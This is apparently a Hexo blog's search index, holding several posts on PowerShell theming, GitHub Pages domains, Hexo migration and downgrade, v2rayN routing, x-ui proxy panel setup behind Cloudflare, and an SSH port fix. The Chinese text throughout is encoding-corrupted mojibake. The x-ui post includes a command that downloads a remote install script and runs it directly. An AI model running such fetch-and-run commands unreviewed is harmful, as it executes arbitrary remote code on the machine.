<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2024/06/27/hexo-shang-chuan-tu-pian/"/>
      <url>/2024/06/27/hexo-shang-chuan-tu-pian/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/06/25/powershell-mei-hua/"/>
      <url>/2024/06/25/powershell-mei-hua/</url>
      
        <content type="html"><![CDATA[<h1 id="powershellç¾åŒ–"><a href="#powershellç¾åŒ–" class="headerlink" title="powershellç¾åŒ–"></a>powershellç¾åŒ–</h1><h2 id="å®‰è£…ä¸»é¢˜æ§ä»¶"><a href="#å®‰è£…ä¸»é¢˜æ§ä»¶" class="headerlink" title="å®‰è£…ä¸»é¢˜æ§ä»¶"></a>å®‰è£…ä¸»é¢˜æ§ä»¶</h2><p>å®‰è£…ä¸»é¢˜oh-my-poshï¼Œpowershellä¸­æ‰§è¡Œ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">winget <span class="token function">install</span> JanDeDobbeleer.OhMyPosh <span class="token parameter variable">-s</span> wingetoh-my-posh init pwsh <span class="token operator">|</span> Invoke-Expression <span class="token comment"># æŸ¥çœ‹æ•ˆæœï¼Œè¿™é‡Œå¯èƒ½ä¸èƒ½æ˜¾ç¤ºç¬¦å·</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç‚¹å‡»åŠ å·æ—è¾¹è¿›å…¥è®¾ç½®ï¼Œå·¦è¾¹ç‚¹å‡»powershellï¼Œå‘ä¸‹æ»‘ç‚¹å‡»å¤–è§‚ï¼Œå°†å­—ä½“æ”¹æˆnerdç±»å‹çš„å­—ä½“ï¼Œä¹Ÿèƒ½åˆ°<a href="https://www.nerdfonts.com/font-downloads">Nerd Fonts - Iconic font aggregator, glyphs/icons collection, &amp; fonts patcher</a>ä¸‹è½½å­—ä½“</p><p>ä¹Ÿèƒ½ç›´æ¥æ”¹é»˜è®¤</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Get-PoshThemes <span class="token comment"># æŸ¥çœ‹ä¸»é¢˜</span><span class="token comment"># é€‰æ‹©å¹¶åº”ç”¨ä¸€ä¸ªä¸»é¢˜</span>oh-my-posh init pwsh <span class="token parameter variable">--config</span> <span class="token string">"C:\path<span class="token entity" title="\t">\t</span>o<span class="token entity" title="\t">\t</span>heme.json"</span> <span class="token operator">|</span> Invoke-Expression<span class="token comment"># å°† C:\path\to\theme.json æ›¿æ¢ä¸ºå®é™…çš„ä¸»é¢˜æ–‡ä»¶è·¯å¾„ã€‚</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>githubpageæ·»åŠ åŸŸå</title>
      <link href="/2024/06/23/githubpage-tian-jia-yu-ming/"/>
      <url>/2024/06/23/githubpage-tian-jia-yu-ming/</url>
      
        <content type="html"><![CDATA[<h1 id="githubpageæ·»åŠ åŸŸå"><a href="#githubpageæ·»åŠ åŸŸå" class="headerlink" title="githubpageæ·»åŠ åŸŸå"></a>githubpageæ·»åŠ åŸŸå</h1><h2 id="åŸŸåè§£æ"><a href="#åŸŸåè§£æ" class="headerlink" title="åŸŸåè§£æ"></a>åŸŸåè§£æ</h2><p>åˆ°åŸŸåè§£æå•†æ·»åŠ è®°å½•</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ä¸€æ¡Aè®°å½• ä¸»æœºè®°å½•@ ä½ çš„åšå®¢IP<span class="token punctuation">(</span>ping xxx.github.io<span class="token punctuation">)</span>ä¸€æ¡CNAMEè®°å½• ä¸»æœºè®°å½•www xxx.github.io<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="ç»‘å®šgithub"><a href="#ç»‘å®šgithub" class="headerlink" title="ç»‘å®šgithub"></a>ç»‘å®šgithub</h2><p>è¿›å…¥pageé¡¹ç›®çš„ä»“åº“ï¼Œç‚¹å‡»settingsï¼Œè®¾ç½®Custom domainï¼Œè¾“å…¥è‡ªå·±çš„åŸŸåï¼Œæ£€æµ‹é€šè¿‡åï¼Œåˆ°sourceæ–‡ä»¶å¤¹ä¸‹åˆ›å»º<code>CNAME.txt</code>å†…å®¹ä¸º<code>ä½ çš„åŸŸå</code></p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexoè¿ç§»</title>
      <link href="/2024/06/23/hexo-qian-yi/"/>
      <url>/2024/06/23/hexo-qian-yi/</url>
      
        <content type="html"><![CDATA[<h1 id="hexoè¿ç§»"><a href="#hexoè¿ç§»" class="headerlink" title="hexoè¿ç§»"></a>hexoè¿ç§»</h1><h2 id="ç›´æ¥æ›´æ¢ç”µè„‘"><a href="#ç›´æ¥æ›´æ¢ç”µè„‘" class="headerlink" title="ç›´æ¥æ›´æ¢ç”µè„‘"></a>ç›´æ¥æ›´æ¢ç”µè„‘</h2><h3 id="å®‰è£…ç¯å¢ƒ"><a href="#å®‰è£…ç¯å¢ƒ" class="headerlink" title="å®‰è£…ç¯å¢ƒ"></a>å®‰è£…ç¯å¢ƒ</h3><p>å®‰è£…gitå’Œnodeï¼Œè‡ªè¡Œæœç´¢å®‰è£…ï¼Œnodeæ¨èå®‰è£…åœ¨githubä¸Šçš„nvmï¼Œæ–¹ä¾¿åˆ‡æ¢ç‰ˆæœ¬</p><h3 id="æœ¬æœºä¸githubå»ºç«‹è¿æ¥"><a href="#æœ¬æœºä¸githubå»ºç«‹è¿æ¥" class="headerlink" title="æœ¬æœºä¸githubå»ºç«‹è¿æ¥"></a>æœ¬æœºä¸githubå»ºç«‹è¿æ¥</h3><p>è®¾ç½®gité…ç½®ä¿¡æ¯</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> config <span class="token parameter variable">--global</span> user.name <span class="token string">"ä½ çš„GitHubç”¨æˆ·å"</span><span class="token function">git</span> config <span class="token parameter variable">--global</span> user.email <span class="token string">"ä½ çš„GitHubæ³¨å†Œé‚®ç®±"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç”Ÿæˆsshå¯†é’¥æ–‡ä»¶</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-keygen <span class="token parameter variable">-t</span> rsa <span class="token parameter variable">-C</span> <span class="token string">"ä½ çš„GitHubæ³¨å†Œé‚®ç®±"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åè¿ç»­ä¸‰æ¬¡å›è½¦</p><p><code>c/Users/youuser/.ssh/id_rsa.pub</code>é‡Œé¢çš„å†…å®¹å³æ˜¯åŒæ–¹é€šä¿¡çš„å¯†é’¥</p><p>å°†å¯†é’¥å¤åˆ¶åˆ°github-&gt;å³ä¸Šè§’å¤´åƒ-&gt;settings-&gt;SSH and GPG keysï¼Œä¿å­˜</p><p>æœ¬æœºæµ‹è¯•è¿æ¥</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> <span class="token parameter variable">-T</span> git@github.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="å®‰è£…hexo"><a href="#å®‰è£…hexo" class="headerlink" title="å®‰è£…hexo"></a>å®‰è£…hexo</h3><p>åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ç”¨äºå­˜æ”¾åšå®¢æ–‡ä»¶ï¼Œcd è¿›å…¥è¯¥ç›®å½•ï¼Œæ‰§è¡Œå‘½ä»¤</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> <span class="token parameter variable">-g</span> hexo-cli <span class="token comment">#å®‰è£…hexo</span><span class="token function">npm</span> update hexo <span class="token parameter variable">-g</span> <span class="token comment">#å‡çº§hexo</span>hexo init  --no-install <span class="token comment">#åˆå§‹åŒ–blogï¼Œéœ€è¦å…ˆåˆ›å»ºä¸€ä¸ªåšå®¢ä¸»æ–‡ä»¶å¤¹ï¼Œåœ¨æ–‡ä»¶å¤¹é‡Œæ‰§è¡Œï¼Œå°±æ˜¯ä¸Šé¢åˆ›å»ºçš„ï¼Œæˆ–è€…</span>hexo init blog<span class="token punctuation">(</span>æ–‡ä»¶å¤¹å<span class="token punctuation">)</span> --no-install <span class="token comment">#--no-installæ˜¯é˜»æ­¢é¡¹ç›®å…‹éš†ä¸‹æ¥åï¼Œè‡ªåŠ¨å®‰è£…ä¾èµ–ï¼Œä¸ä½¿ç”¨ä¼šè‡ªåŠ¨å®‰è£…æœ€æ–°ç‰ˆæœ¬hexoï¼Œå…·ä½“è‡ªå·±å½±å“å®æµ‹</span><span class="token function">npm</span> <span class="token function">install</span> hexo@5.4.0 <span class="token comment">#å®‰è£…æƒ³è¦çš„hexoç‰ˆæœ¬ï¼Œæˆ‘çš„è¿™ä¸ªä¸»é¢˜è¿™ä¸ªç‰ˆæœ¬åˆé€‚</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å®‰è£…æ’ä»¶"><a href="#å®‰è£…æ’ä»¶" class="headerlink" title="å®‰è£…æ’ä»¶"></a>å®‰è£…æ’ä»¶</h3><p>æ—§ç”µè„‘åœ¨åšå®¢ä¸»ç›®å½•æ‰§è¡Œ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> list <span class="token comment"># æŸ¥çœ‹å®‰è£…è¿‡çš„æ’ä»¶</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ–°ç”µè„‘æ‰§è¡Œ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-deployer-git <span class="token comment">#å®‰è£…åŒ…åå­—ï¼Œä¸åŠ ç‰ˆæœ¬é»˜è®¤æœ€æ–° </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¹Ÿèƒ½æŠŠæ—§ç”µè„‘çš„<code>package.json</code>æ–‡ä»¶å¤åˆ¶åˆ°æ–°ç”µè„‘ï¼Œåœ¨ä¸»ç›®å½•ä¸‹æ‰§è¡Œ<code>npm install</code>å®‰è£…æ’ä»¶</p><h3 id="ç§»æ¤æ–‡ä»¶"><a href="#ç§»æ¤æ–‡ä»¶" class="headerlink" title="ç§»æ¤æ–‡ä»¶"></a>ç§»æ¤æ–‡ä»¶</h3><p>å°†<code>source</code> <code>themes</code> <code>_config.yml</code>ä»æ—§ç”µè„‘å¤åˆ¶è¿‡æ¥</p><h3 id="éƒ¨ç½²"><a href="#éƒ¨ç½²" class="headerlink" title="éƒ¨ç½²"></a>éƒ¨ç½²</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo g <span class="token comment">#ç”Ÿæˆé™æ€æ–‡ä»¶</span>hexo s <span class="token comment">#æµ‹è¯•ç½‘é¡µ</span>hexo d <span class="token comment">#æ²¡é—®é¢˜éƒ¨ç½²</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>v2raynè·¯ç”±è§„åˆ™</title>
      <link href="/2024/01/28/v2rayn-lu-you-gui-ze/"/>
      <url>/2024/01/28/v2rayn-lu-you-gui-ze/</url>
      
        <content type="html"><![CDATA[<h1 id="v2raynè·¯ç”±è§„åˆ™"><a href="#v2raynè·¯ç”±è§„åˆ™" class="headerlink" title="v2raynè·¯ç”±è§„åˆ™"></a>v2raynè·¯ç”±è§„åˆ™</h1><p>å¤§ä½“å¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« <a href="https://www.v2fly.org/config/routing.html">Routing è·¯ç”± | V2Fly.org</a></p><p>æœ¬æ¬¡æµ‹è¯•æ‰€ç”¨ç‰ˆæœ¬ä¸º6.33</p><p>è®¾ç½®-&gt;è·¯ç”±è®¾ç½®-&gt;å¯ç”¨é«˜çº§åŠŸèƒ½-&gt;é«˜çº§åŠŸèƒ½-&gt;æ·»åŠ è§„åˆ™é›†-&gt;(éšä¾¿å†™ä¸ªåˆ«å)æ·»åŠ è§„åˆ™</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxy  <span class="token comment"># ä»£ç†çš„domainå’ŒIP</span>direct <span class="token comment"># ç›´è¿çš„</span>block <span class="token comment"># é˜»å¡çš„ï¼Œä¸€èˆ¬ä¸ºå±è”½å¹¿å‘ŠIP</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å‡å¦‚æˆ‘æƒ³ä»£ç†ä¸€äº›domainå’ŒIPï¼Œé€‰æ‹©proxyï¼Œç«¯å£ä¸å†™åº”è¯¥å°±æ˜¯å…¨éƒ¨ï¼Œå†™æ³•</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">80</span><span class="token number">1</span>-1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>enabledå¯ç”¨ï¼Œå‹¾é€‰ä¿å­˜æ—¶Domainï¼ŒIPï¼Œè¿›ç¨‹åè‡ªåŠ¨æ’åº</p><p>domainå†™æ³•</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">domain:å®Œæ•´åŸŸåkeyword:åŸŸåå…³é”®å­—regexp:æ­£åˆ™è¡¨è¾¾å¼full:å®Œå…¨åŒ¹é…å­—ç¬¦ä¸²geosite:åŸŸåé›† <span class="token comment"># å®˜æ–¹ç½‘ç«™æŸ¥çœ‹</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://github.com/Loyalsoldier/v2ray-rules-dat">Loyalsoldier/v2ray-rules-dat: ğŸ¦„ ğŸƒ ğŸ‘» V2Ray è·¯ç”±è§„åˆ™æ–‡ä»¶åŠ å¼ºç‰ˆï¼Œå¯ä»£æ›¿ V2Ray å®˜æ–¹ geoip.dat å’Œ geosite.datï¼Œå…¼å®¹ Shadowsocks-windowsã€Xray-coreã€Trojan-Goã€leaf å’Œ hysteriaã€‚Enhanced edition of V2Ray rules dat files, compatible with Xray-core, Shadowsocks-windows, Trojan-Go, leaf and hysteria. (github.com)</a></p><p>IPå†™æ³•</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">geoip:IPé›† <span class="token comment"># å®˜æ–¹ç½‘ç«™æŸ¥çœ‹</span>å•ä¸ªIPIPæ®µ,å¦‚:192.166.23.22/23<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>x-uié¢æ¿éƒ¨ç½²ä»£ç†+å¥—CF</title>
      <link href="/2024/01/28/x-ui-mian-ban-bu-shu-jie-dian-tao-cf/"/>
      <url>/2024/01/28/x-ui-mian-ban-bu-shu-jie-dian-tao-cf/</url>
      
        <content type="html"><![CDATA[<h1 id="x-uié¢æ¿éƒ¨ç½²ä»£ç†-å¥—CF"><a href="#x-uié¢æ¿éƒ¨ç½²ä»£ç†-å¥—CF" class="headerlink" title="x-uié¢æ¿éƒ¨ç½²ä»£ç†+å¥—CF"></a>x-uié¢æ¿éƒ¨ç½²ä»£ç†+å¥—CF</h1><p>é¡¹ç›®é“¾æ¥<a href="https://github.com/vaxilu/x-ui">vaxilu/x-ui: æ”¯æŒå¤šåè®®å¤šç”¨æˆ·çš„ xray é¢æ¿ (github.com)</a></p><h2 id="1-å‡†å¤‡å·¥ä½œ"><a href="#1-å‡†å¤‡å·¥ä½œ" class="headerlink" title="1. å‡†å¤‡å·¥ä½œ"></a>1. å‡†å¤‡å·¥ä½œ</h2><p>ç¡®å®šé˜²ç«å¢™æ˜¯å¦å…³é—­ï¼Œæˆ–è€…æ‰‹åŠ¨å¼€æ”¾ç«¯å£ï¼Œä¸èƒ½ä¸èƒ½ç™»å½•é¢æ¿</p><p>æ›´æ–°ç³»ç»Ÿä¾èµ–</p><p>Ubuntuï¼š<code>apt update -y</code>    centos  ï¼š<code>yum update -y</code></p><h2 id="2-å®‰è£…"><a href="#2-å®‰è£…" class="headerlink" title="2. å®‰è£…"></a>2. å®‰è£…</h2><p>æ‰§è¡Œå‘½ä»¤è¿è¡Œè„šæœ¬</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> <span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token function">curl</span> <span class="token parameter variable">-Ls</span> https://raw.githubusercontent.com/vaxilu/x-ui/master/install.sh<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å®‰è£…/æ›´æ–°å®Œæˆåéœ€è¦å¼ºåˆ¶ä¿®æ”¹ç«¯å£ä¸è´¦æˆ·å¯†ç â€”â€”è¾“å…¥<code>y</code>æŒ‰ç…§æç¤ºè¾“å‡ºä¿¡æ¯</p><p>å®Œæˆåè¿›å…¥ç½‘å€<code>ä¸»æœºIP:ä½ è¾“å…¥çš„ç«¯å£å·</code>ï¼Œè¾“å…¥è´¦å·å¯†ç </p><p>è¿›å…¥ä¸»é¡µé¢ï¼Œé€‰æ‹©é¢æ¿è®¾ç½®ï¼Œæ›´æ”¹é¢æ¿urlæ ¹è·¯å¾„ï¼Œæ›´æ”¹åé‡å¯ï¼Œå†æ¬¡è¿›å…¥æ—¶ä½¿ç”¨åœ°å€<code>ä¸»æœºIP:ä½ è¾“å…¥çš„ç«¯å£å·/æ›´æ”¹çš„æ ¹è·¯å¾„</code>ï¼Œå…¶ä»–æ ¹æ®è‡ªèº«æ›´æ”¹</p><h2 id="3-SSLè¯ä¹¦ç”³è¯·"><a href="#3-SSLè¯ä¹¦ç”³è¯·" class="headerlink" title="3. SSLè¯ä¹¦ç”³è¯·"></a>3. SSLè¯ä¹¦ç”³è¯·</h2><p>è¾“å…¥<code>x-ui</code>è¿›å…¥é¢æ¿ç®¡ç†ï¼Œé€‰æ‹©16å›è½¦</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">******ä½¿ç”¨è¯´æ˜******è¯¥è„šæœ¬å°†ä½¿ç”¨Acmeè„šæœ¬ç”³è¯·è¯ä¹¦,ä½¿ç”¨æ—¶éœ€ä¿è¯:<span class="token number">1</span>.çŸ¥æ™“Cloudflare æ³¨å†Œé‚®ç®±<span class="token number">2</span>.çŸ¥æ™“Cloudflare Global API Key<span class="token number">3</span>.åŸŸåå·²é€šè¿‡Cloudflareè¿›è¡Œè§£æåˆ°å½“å‰æœåŠ¡å™¨<span class="token number">4</span>.è¯¥è„šæœ¬ç”³è¯·è¯ä¹¦é»˜è®¤å®‰è£…è·¯å¾„ä¸º/root/certç›®å½•<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‡†å¤‡å¥½è¿™äº›ä¸œè¥¿ï¼Œcloudflareç›´æ¥é‚®ç®±æ³¨å†Œ<a href="https://cloudflare.com/%EF%BC%8CAPI">https://cloudflare.com/ï¼ŒAPI</a> KEY</p><p><img src="/.io//x-ui%E9%9D%A2%E6%9D%BF%E9%83%A8%E7%BD%B2%E8%8A%82%E7%82%B9+%E5%A5%97CF%5Cimage-20240307054345145.png" alt="image-20240307054345145"></p><p>ä¹‹åä¾æ¬¡è¾“å…¥</p><p><img src="/.io//x-ui%E9%9D%A2%E6%9D%BF%E9%83%A8%E7%BD%B2%E8%8A%82%E7%82%B9+%E5%A5%97CF%5Cimage-20240307054521404.png" alt="image-20240307054521404"></p><p>æ³¨æ„è¾“å…¥çš„åŸŸåä¸ºä½ è§£æåˆ°CFä¸Šçš„åŸŸåï¼Œä¸æ˜¯Aè®°å½•çš„åŸŸåï¼Œå¦‚ä¸‹å›¾1çš„ä½ç½®</p><p><img src="/.io//x-ui%E9%9D%A2%E6%9D%BF%E9%83%A8%E7%BD%B2%E8%8A%82%E7%82%B9+%E5%A5%97CF%5Cimage-20240307055228662.png" alt="image-20240307055228662"></p><p>ä¹‹åè¿›å…¥é¢æ¿è®¾ç½®</p><p><img src="/.io//x-ui%E9%9D%A2%E6%9D%BF%E9%83%A8%E7%BD%B2%E8%8A%82%E7%82%B9+%E5%A5%97CF%5Cimage-20240307055410275.png" alt="image-20240307055410275"></p><p>å°†<code>/root/cert/xxx</code>å¡«å…¥æ¡†ä¸­ï¼Œä¸Šé¢æ˜¯cerï¼Œä¸‹é¢æ˜¯keyï¼Œä¹‹åè¿›å…¥cloudflareï¼Œæ”¹æˆè¿™æ ·ï¼Œæ‰“å¼€ä¸Šé¢å›¾2æ ‡è®°çš„å°äº‘æœµï¼Œè¿™æ ·æµé‡å°±è¢«cfä»£ç†äº†</p><p><img src="/.io//x-ui%E9%9D%A2%E6%9D%BF%E9%83%A8%E7%BD%B2%E8%8A%82%E7%82%B9+%E5%A5%97CF%5Cimage-20240307055729883.png" alt="image-20240307055729883"></p><h2 id="4-åˆ›å»ºä»£ç†"><a href="#4-åˆ›å»ºä»£ç†" class="headerlink" title="4. åˆ›å»ºä»£ç†"></a>4. åˆ›å»ºä»£ç†</h2><p>æ¥ä¸Šé¢æ ‡è®°çš„é‚£å¼ å›¾ï¼Œå°†ä½ çš„ä¸»æœºIPè§£æåˆ°è¿™ä¸ªåŸŸåçš„Aè®°å½•ä¸‹ï¼Œåç§°éšæ„å¡«å†™ï¼Œç›¸å½“äºå¾—åˆ°äº†ä¸€ä¸ªä¸‰çº§åŸŸåâ€”â€”<code>åç§°.åŸŸå</code>ï¼Œä¾‹å¦‚<code>test.example.com</code></p><p>è¿›å…¥x-ui é¢æ¿å…¥ç«™åˆ—è¡¨-æ·»åŠ å…¥ç«™</p><p><img src="/.io//x-ui%E9%9D%A2%E6%9D%BF%E9%83%A8%E7%BD%B2%E8%8A%82%E7%82%B9+%E5%A5%97CF%5Cimage-20240307060728590.png" alt="image-20240307060728590"></p><p><img src="/.io//x-ui%E9%9D%A2%E6%9D%BF%E9%83%A8%E7%BD%B2%E8%8A%82%E7%82%B9+%E5%A5%97CF%5Cimage-20240307060941380.png" alt="image-20240307060941380"></p><p>è¿™é‡Œçš„åŸŸåå°±æ˜¯ä½ è‡ªå·±è§£æåˆ°çš„åŸŸåï¼Œåç§°+åŸŸåï¼Œæ·»åŠ ï¼Œåˆ†äº«äºŒç»´ç å°±å¯ä»¥ä½¿ç”¨äº†</p><h2 id="5-å¥—CFä¼˜é€‰IP"><a href="#5-å¥—CFä¼˜é€‰IP" class="headerlink" title="5. å¥—CFä¼˜é€‰IP"></a>5. å¥—CFä¼˜é€‰IP</h2><p><a href="https://github.com/badafans/better-cloudflare-ip">badafans/better-cloudflare-ip: æŸ¥æ‰¾é€‚åˆè‡ªå·±å½“å‰ç½‘ç»œç¯å¢ƒçš„ä¼˜é€‰cloudflare anycast IP (github.com)</a></p><p><a href="https://github.com/XIU2/CloudflareSpeedTest">XIU2/CloudflareSpeedTest: ğŸŒ©ã€Œè‡ªé€‰ä¼˜é€‰ IPã€æµ‹è¯• Cloudflare CDN å»¶è¿Ÿå’Œé€Ÿåº¦ï¼Œè·å–æœ€å¿« IP ï¼å½“ç„¶ä¹Ÿæ”¯æŒå…¶ä»– CDN / ç½‘ç«™ IP ~ (github.com)</a></p><p>ä¸¤æ¬¾å·¥å…·</p><p><img src="/.io//x-ui%E9%9D%A2%E6%9D%BF%E9%83%A8%E7%BD%B2%E8%8A%82%E7%82%B9+%E5%A5%97CF%5Cimage-20240307061731515.png" alt="image-20240307061731515"></p><p>å°†ä¼˜é€‰å¾—åˆ°çš„åœ°å€å¡«å†™ä¸Šå»ï¼Œå°†åŸæ¥çš„åœ°å€å†™åˆ°ä¼ªè£…åŸŸåï¼Œéœ€è¦ä¼˜é€‰443è¿™ä¸ªç«¯å£çš„åœ°å€</p><h2 id="6-å…¶ä»–ç±»å‹çš„ä»£ç†"><a href="#6-å…¶ä»–ç±»å‹çš„ä»£ç†" class="headerlink" title="6.å…¶ä»–ç±»å‹çš„ä»£ç†"></a>6.å…¶ä»–ç±»å‹çš„ä»£ç†</h2><p>ä¸Šé¢ä¹Ÿå¯ä»¥ä¸ç”¨443ç«¯å£ï¼Œè¿™è¦æ·»åŠ ä¸€æ¡è§„åˆ™</p><p><img src="/.io//x-ui%E9%9D%A2%E6%9D%BF%E9%83%A8%E7%BD%B2%E8%8A%82%E7%82%B9+%E5%A5%97CF%5Cimage-20240307062711360.png" alt="image-20240307062711360"></p><p>ç„¶åå°±å¯ä»¥ä¼˜é€‰443çš„åœ°å€ï¼Œç«¯å£æ”¹å†™443</p><p>ä¹Ÿèƒ½ç›´æ¥ä½¿ç”¨å…¶ä»–çš„ç«¯å£ï¼Œä¸‹é¢å°±ä¸éœ€è¦æ‰“å¼€tls</p><p>ä¹Ÿå¯ä»¥ç½‘ç»œç›´æ¥é€‰æ‹©tcpï¼Œé€‰æ‹©realityï¼Œè¿™ç§æ˜¯ç›´è¿ï¼Œè¦çœ‹ä½ çš„æœåŠ¡å™¨ç½‘ç»œè´¨é‡</p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSHè¿æ¥æŠ¥é”™</title>
      <link href="/2024/01/20/ssh-lian-jie-bao-cuo/"/>
      <url>/2024/01/20/ssh-lian-jie-bao-cuo/</url>
      
        <content type="html"><![CDATA[<h1 id="SSHè¿æ¥æŠ¥é”™"><a href="#SSHè¿æ¥æŠ¥é”™" class="headerlink" title="SSHè¿æ¥æŠ¥é”™"></a>SSHè¿æ¥æŠ¥é”™</h1><p>å½“æ—¶gitæäº¤æ—¶å‡ºç°è¿æ¥å¤±è´¥ç­‰æç¤ºï¼Œè¯•ä¸€è¯•å‘½ä»¤<code>ssh -T git@github.com</code>ï¼Œè‹¥æŠ¥é”™å¦‚ä¸‹</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh: connect to <span class="token function">host</span> github.com port <span class="token number">22</span>: Connection timed out<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åˆ™è¯•ä¸€è¯•<code>ssh -T -p 443 git@ssh.github.com</code>ï¼Œè‹¥æˆåŠŸåˆ™ä¿®æ”¹<code>~/.ssh/config</code>æ–‡ä»¶ï¼Œæ·»åŠ </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Host github.comHostname ssh.github.comPort <span class="token number">443</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å†æ¬¡<code>ssh -T git@github.com</code>æˆåŠŸï¼Œåˆ™å¯ä»¥è¿›è¡Œæäº¤ï¼Œè¿™æ˜¯ç”±äº22ç«¯å£å¤„äºæŸç§åŸå› å‡ºç°äº†é—®é¢˜ï¼Œä¹‹åä»ç„¶å¯ä»¥ä¿®æ”¹ä¸ºåŸé…ç½®ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä½¿ç”¨ä¸»é¢˜materyè€Œé™çº§hexoç‰ˆæœ¬</title>
      <link href="/2024/01/20/shi-yong-zhu-ti-matery-jiang-ji-hexo-ban-ben/"/>
      <url>/2024/01/20/shi-yong-zhu-ti-matery-jiang-ji-hexo-ban-ben/</url>
      
        <content type="html"><![CDATA[<h1 id="ä½¿ç”¨ä¸»é¢˜materyè€Œé™çº§hexoç‰ˆæœ¬"><a href="#ä½¿ç”¨ä¸»é¢˜materyè€Œé™çº§hexoç‰ˆæœ¬" class="headerlink" title="ä½¿ç”¨ä¸»é¢˜materyè€Œé™çº§hexoç‰ˆæœ¬"></a>ä½¿ç”¨ä¸»é¢˜materyè€Œé™çº§hexoç‰ˆæœ¬</h1><p>é‡åˆ°é—®é¢˜æŒ‰æ—¶é—´é¡ºåº</p><ul><li><p>å‡çº§hexoåˆ°7.0.0åä»£ç å—æ˜¾ç¤ºå¼‚å¸¸</p><p>è€ƒè™‘hexoåˆ‡æ¢ç‰ˆæœ¬å’Œå‡çº§materyç‰ˆæœ¬ï¼Œmateryæ›´æ–°åˆ°åˆ›ä½œè€…æœ€æ–°ç‰ˆæœ¬ï¼Œhexoé™çº§å‡ºç°é—®é¢˜</p></li><li><p>hexoé™çº§å¤±è´¥ï¼Œå› ä¸ºnode.jsç‰ˆæœ¬è¿‡é«˜</p><p>é™çº§node.jsç‰ˆæœ¬ï¼Œä½¿ç”¨å·¥å…·nvmç®¡ç†node.jsç‰ˆæœ¬ï¼Œæˆ‘ä½¿ç”¨çš„node.jsç‰ˆæœ¬ä¸º16â€¦.</p></li><li><p>hexoé™çº§çš„å…·ä½“è¿‡ç¨‹</p><p>å…ˆåˆ é™¤åŸåšå®¢æ–‡ä»¶å¤¹ï¼Œæˆ–è€…æ”¹åï¼Œä¾æ¬¡æ‰§è¡Œ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-cli <span class="token parameter variable">-g</span> <span class="token comment">#å®‰è£…hexoå¤§æ¡†æ¶ï¼Œç”¨æ¥åˆå§‹åŒ–ï¼Œè¿™é‡Œå…¨å±€å®‰è£…æ˜¯ä¸ºäº†åé¢åˆå§‹åŒ–ä½¿ç”¨hexo</span>hexo init  --no-install <span class="token 